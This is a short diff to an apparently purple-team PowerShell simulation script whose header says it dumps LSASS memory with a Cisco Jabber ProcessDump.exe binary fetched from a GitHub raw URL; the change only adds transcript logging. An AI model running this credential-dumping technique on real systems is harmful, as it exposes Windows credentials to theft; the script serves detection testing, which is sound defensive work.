@@ -5,6 +5,7 @@
     Dump lsass with ProcessDump.exe from cisco-jabber software
 #>
 
+Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append
 
 # Execute ProcessDump from cisco-jabber software
 $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/ProcessDump.exe"
@@ -42,4 +43,4 @@ catch {
     Write-Error $_
 }
 
-
+Stop-Transcript
